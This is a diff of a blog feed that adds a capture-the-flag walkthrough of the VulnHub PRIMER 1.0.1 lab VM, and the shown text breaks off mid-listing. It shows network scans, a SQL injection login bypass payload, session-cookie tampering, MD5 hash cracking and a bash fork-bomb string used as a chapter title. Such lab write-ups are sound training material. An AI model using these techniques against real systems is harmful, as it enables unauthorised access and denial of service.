@@ -4,7 +4,7 @@
   <title><![CDATA[F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2016-01-24T05:59:02-05:00</updated>
+  <updated>2016-04-12T09:46:44-04:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -12,6 +12,615 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] PRIMER:1.0.1]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2016/04/12/vulnhub-primer-1-dot-0-1/"/>
+    <updated>2016-04-12T08:43:27-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2016/04/12/vulnhub-primer-1-dot-0-1</id>
+    <content type="html"><![CDATA[<p>&ldquo;Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and responsibility.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/arne-rick,217/">Arne Rick(@couchsofa)</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/primer-101,136/">here</a> or <a href="http://wiki.fablab-karlsruhe.de/doku.php?id=projekte:primer">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>
+
+<p>Target: PRIMER: 1.0.1 (<em>10.1.1.151/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<p>There is no acutal Vulnerabilities (except a simple SQL injection), all you need to do to take down this VM is Enumeration and more enumberation.</p>
+
+<ul>
+<li>Checking source code / comments</li>
+<li>Enumeration, Enumeration and more Enumeration</li>
+<li>Puzzle cracking</li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
+</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
+</span><span class='line'>10.1.1.151    00:0c:29:ad:7e:f2   VMware, Inc.
+</span><span class='line'>10.1.1.254    00:50:56:f4:51:9f   VMware, Inc.
+</span><span class='line'>
+</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.859 seconds <span class="o">(</span>89.54 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>10.1.1.151</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.151/32 --rate<span class="o">=</span>10000
+</span><span class='line'>
+</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-01-22 23:48:47 GMT
+</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class='line'>Initiating SYN Stealth Scan
+</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span><span class='line'>Discovered open port 80/tcp on 10.1.1.151
+</span><span class='line'>Discovered open port 22/tcp on 10.1.1.151
+</span><span class='line'>Discovered open port 111/tcp on 10.1.1.151
+</span><span class='line'>Discovered open port 33786/tcp on 10.1.1.151
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Fri Jan 22 18:50:28 2016 as: nmap -sV -A -O -p 22,80,111,33786 -v -oN 10.1.1.151_nmap.txt 10.1.1.151</span>
+</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.151
+</span><span class='line'>Host is up <span class="o">(</span>0.00077s latency<span class="o">)</span>.
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> ssh-hostkey:
+</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 01:2e:60:5f:99:48:3b:2f:c0:72:c6:ae:48:02:5e:33 <span class="o">(</span>DSA<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ed:26:be:cc:c6:2a:93:d1:e1:6d:0d:5a:53:7b:4d:fb <span class="o">(</span>RSA<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 7f:4e:64:a0:c4:8a:13:8e:e9:86:3d:5d:49:04:c4:54 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+</span><span class='line'><span class="p">|</span>_http-methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
+</span><span class='line'><span class="p">|</span>_/4_8f14e45fceea167a5a36dedd4bea2543
+</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>_http-title: PRIMER
+</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          33786/tcp  status
+</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          36908/udp  status
+</span><span class='line'>33786/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          33786/tcp  status
+</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          36908/udp  status
+</span><span class='line'>MAC Address: 00:0C:29:AD:7E:F2 <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 3.2 - 3.19
+</span><span class='line'>Uptime guess: 0.001 days <span class="o">(</span>since Fri Jan <span class="m">22</span> 18:49:50 2016<span class="o">)</span>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">261</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span><span class='line'>IP ID Sequence Generation: All zeros
+</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'><span class="m">1</span>   0.77 ms 10.1.1.151
+</span><span class='line'>
+</span><span class='line'>Read data files from: /usr/bin/../share/nmap
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class='line'><span class="c"># Nmap done at Fri Jan 22 18:50:44 2016 -- 1 IP address (1 host up) scanned in 16.87 seconds</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Four ports are found: <code>22, 80, 111, 33786</code> and a hidden folder <code>/4_8f14e45fceea167a5a36dedd4bea2543</code> is found in <code>robots.txt</code>.</p>
+
+<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80 found by port-scanning stage.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
+</span><span class='line'>+ Target Host: 10.1.1.151
+</span><span class='line'>+ Target Port: 80
+</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x16ef 0x522ed6bcd00c0
+</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span><span class='line'>+ GET Entry <span class="s1">&#39;/4_8f14e45fceea167a5a36dedd4bea2543/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span><span class='line'>+ GET <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">1</span> entry which should be manually viewed.
+</span><span class='line'>+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;x-ob_mode&#39;</span> found, with contents: 0
+</span><span class='line'>+ OSVDB-3092: GET /manual/: Web server manual found.
+</span><span class='line'>+ OSVDB-3268: GET /manual/images/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
+</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This result approved the finding from NMAP scan and also found a new folder <code>/phpmyadmin/</code>.</p>
+
+<p>Now open firefox to check the WEB application.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/1.png"></p>
+
+<h3>Part 1: [PRIMER]</h3>
+
+<h4>charpter 1: [<strong>init</strong>]</h4>
+
+<p>On the first page, here is a login form. After playing with this page for a while such as checking source code, try weak passwords&hellip; but nothing found.
+I decided to test some basic SQL injection, and it is vulnerable!</p>
+
+<p>type the following in username and any rubbish in password, and then submit the form to bypass the login.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">Username</span> <span class="o">=</span> <span class="err">&#39;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> -- -
+</span><span class='line'><span class="nv">Password</span> <span class="o">=</span> xxxxxx
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/2.png"></p>
+
+<h4>chapter 2: [(α=β)&lt;=>(α&lt;=>β)]</h4>
+
+<p>By checking the source code, I noticed the following comments:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;!-- This bot was looking <span class="k">for</span> a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 <span class="nb">hash </span>of the first <span class="m">7</span> digits of pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security. --&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><font color="red"><strong>[note!!]</strong></font> However, here should be the md5 hash value of the first digit of pi&hellip;</p>
+
+<p><code>md5(3) = eccbc87e4b5ce2fe28308fd9f2a7baf3</code></p>
+
+<p>So the next level should be <code>2_eccbc87e4b5ce2fe28308fd9f2a7baf3</code></p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/3.png"></p>
+
+<h4>chapter 3: [&ldquo;[^&rdquo;\r\n]*&ldquo;]</h4>
+
+<p>By checking the source code, I found there is another file <code>style.css</code>. and the hint just hidden in its source code.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/*Clean sessions terminate without leaving things behind. Some are cleaner than others and some are really dirty to begin with. *Programming is an art form, even in the age of the n3t people still make mistakes. *Sometimes, an exploit is as simple as changing a simple value in a <span class="nb">local </span>file. *Piece of cake! */
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>simple value in a local file</code>, well the first thing need to be check is the cookie!</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/4.png"></p>
+
+<p>The sessoin cookie&rsquo;s value <code>activeSession</code> is <code>false</code>. Let&rsquo;s change it to <code>true</code> and refresh the page. and bingo~~</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/5.png"></p>
+
+<h4>Chapter 4: [:(){ :|:&amp;};:]</h4>
+
+<p>This one has been found in nmap scanning phrase, which is found in robots.txt file.</p>
+
+<p><code>http://10.1.1.151/4_8f14e45fceea167a5a36dedd4bea2543/</code></p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/6.png"></p>
+
+<h3>Part 2: [FORK]</h3>
+
+<p>nothing interesting, click <code>EOF</code> will send me to another layer/page:</p>
+
+<p><code>http://10.1.1.151/5_6512bd43d9caa6e02c990b0a82652dca/</code></p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/7.png"></p>
+
+<h4>Chapter 5: [0xC00007B]</h4>
+
+<p>Well, the answer is obvious that <code>/6_c51ce410c124a10e0db5e4b97fc2af39</code>. So keep moving on:</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/8.png"></p>
+
+<p>Here is interesting, Burp proxy and wireshark could not catch anything when I visit <code>http://10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/</code> when I got the password window pop up.</p>
+
+<p>So I try to use curl to check what exactly happened.</p>
+
+<p>based on the respond from the server, I noticed the following javascript code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">root</span><span class="err">@</span><span class="nx">kali</span><span class="o">:~</span><span class="err">#</span> <span class="nx">curl</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;JavaScript&quot;</span><span class="o">&gt;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">X</span><span class="p">;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="s2">&quot;Ikdf076&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;/()=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">X</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">X</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="nx">L</span><span class="p">){}</span>
+</span><span class='line'>  <span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
+</span><span class='line'><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
+</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>analyzed the script, we know that the password is any string which include the pattern <code>Ikdf076</code> since the third latter. such as <code>xxIkdf076xxxx</code>.</p>
+
+<p>So I entered <code>12Ikdf076</code> to bypass the login window and got the next level&rsquo;s entry: <code>7_70efdf2ec9b086079795c442636b55fb</code>.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/9.png"></p>
+
+<h4>Chapter 6: [++Q++++++]</h4>
+
+<p>Now let&rsquo;s move to next level, another input window pop up&hellip;</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/10.png"></p>
+
+<p>Use <code>curl</code> again and from the responded source code, I found the following hints:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
+</span><span class='line'><span class="cm">/*&quot;Someone didn&#39;t bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and...&quot; - The Plague*/</span>
+</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span><span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="nx">X</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">X</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">===</span><span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">==</span><span class="nx">L</span><span class="p">){}</span><span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span>
+</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the comments above, If you have watched the movie <code>Hackers</code> published in 1995, you will know the 4th most-used password here is <code>god</code> :P</p>
+
+<p>From the source code, here we know that <code>X</code> is the md5 value of my input and if <code>X</code> equal to <code>L</code> then the typed password is correct. so we can crack <code>L</code> to get the password.</p>
+
+<p>Using <code>firebug</code> addon, we get the L&rsquo;s value, which is <code>0d28cba0bd4f26e16d766000d27e49fa</code>. After cracked this md5 value, I got the password: <code>GOD</code>.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/11.png"></p>
+
+<p>Now input <code>GOD</code> to bypass this level.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/12.png"></p>
+
+<h4>Chapter 7: [KS(x)&lt;=l(x)+4]</h4>
+
+<p>really stuck here for a while&hellip;</p>
+
+<p>back to the details&hellip;</p>
+
+<p>There are 7 md5 hashes collected from URLs:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>1_c81e728d9d4c2f636f067f89cc14862c
+</span><span class='line'>2_eccbc87e4b5ce2fe28308fd9f2a7baf3
+</span><span class='line'>3_e4da3b7fbbce2345d7772b0674a318d5
+</span><span class='line'>4_8f14e45fceea167a5a36dedd4bea2543
+</span><span class='line'>5_6512bd43d9caa6e02c990b0a82652dca
+</span><span class='line'>6_c51ce410c124a10e0db5e4b97fc2af39
+</span><span class='line'>7_70efdf2ec9b086079795c442636b55fb
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/13.png"></p>
+
+<p>After cracked these md5 hashes and according to the clue from the Title <code>Primer</code>, I guess the 8th URL md5 hash would be <code>8_</code> followed by the value of md5(&lsquo;19&rsquo;): <code>1f0e3dad99908345f7439f8ffabdffc4</code></p>
+
+<p><code>8_1f0e3dad99908345f7439f8ffabdffc4</code></p>
+
+<p>and this took me to the deeper layer @_@</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/14.png"></p>
+
+<p>This page contains a link to next one: <code>http://10.1.1.151/9_37693cfc748049e45d87b8c7d8b9aacd</code></p>
+
+<p>Click <code>EOF</code> and I got the following page:</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/15.png"></p>
+
+<p>Check the source of <code>main.js</code> and found the next link <code>10_23693cff748o49r45d77b6c7d1b9afcd</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>... truncate ...
+</span><span class='line'>setTimeout<span class="o">(</span><span class="k">function</span><span class="o">(){</span> term.clear<span class="o">()</span> //<span class="k">$(</span><span class="s1">&#39;body&#39;</span><span class="k">)</span>.fadeOut<span class="o">(</span><span class="s1">&#39;slow&#39;</span><span class="o">)</span> <span class="k">if</span> <span class="o">(</span> <span class="nv">output</span> <span class="o">==</span> <span class="m">3</span> <span class="o">)</span> <span class="o">{</span> window.location <span class="o">=</span> <span class="s2">&quot;../10_23693cff748o49r45d77b6c7d1b9afcd/&quot;</span><span class="p">;</span> <span class="o">}</span>
+</span><span class='line'>... truncate ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is a shortcut but you will miss the highlight parts of the VM!!</p>
+
+<h3>Part 3: [TRY HARDER]</h3>
+
+<p>Now, go the hard way&hellip;</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/16.png"></p>
+
+<p>play with the limited terminal and walk around for enumeration, I got strong feeling that I need to connect <code>falken@Erebus</code> and the password should be hidden in the log files.</p>
+
+<p>The clue here is <code>falken</code> has a son, name is <code>Joshua</code> and was born in <code>1984</code>. After tried some different combination, I found the correct password <code>joshua1984</code></p>
+
+<p>Now I get in to the Erebus!</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/17.png"></p>
+
+<p>From the result of <code>ps</code> command, i noticed that <code>falken</code> is connected to a server called <code>TrivialZ3r0</code>. Check on-line about the server&rsquo;s name <code>Trivial Zero</code> and I found this is about <code>Riemann Hypothesis</code>, so try <code>Riemann</code> as the password and Bingo~</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/18.png"></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>TrivialZ3r0<span class="o">]</span>: Connection established!
+</span><span class='line'>ps
+</span><span class='line'>USER PID CPU MEM COMMAND
+</span><span class='line'>root <span class="m">3251</span> 3.2 3.5 connect chaos@Wintermute
+</span><span class='line'>falken <span class="m">2005</span> 47.8 77.5 c0re -t Chaos
+</span><span class='line'>root <span class="m">2677</span> 40.5 42.7 c0re -t TrivialZ3r0
+</span><span class='line'>nieve <span class="m">26588</span> 0.7 0.7 ps
+</span><span class='line'>ls
+</span><span class='line'><span class="o">[</span>bin<span class="o">]</span> <span class="o">[</span>etc<span class="o">]</span> <span class="o">[</span>passwd<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">cd </span>passwd
+</span><span class='line'>ls
+</span><span class='line'>falken chaos mccarthy
+</span><span class='line'>cat falken
+</span><span class='line'>
+</span><span class='line'>61ea1974dd974297913b1fa2f0470d26
+</span><span class='line'>
+</span><span class='line'>cat chaos
+</span><span class='line'>
+</span><span class='line'>85241de03d1254ac40274b02caafcd99
+</span><span class='line'>
+</span><span class='line'>cat mccarthy
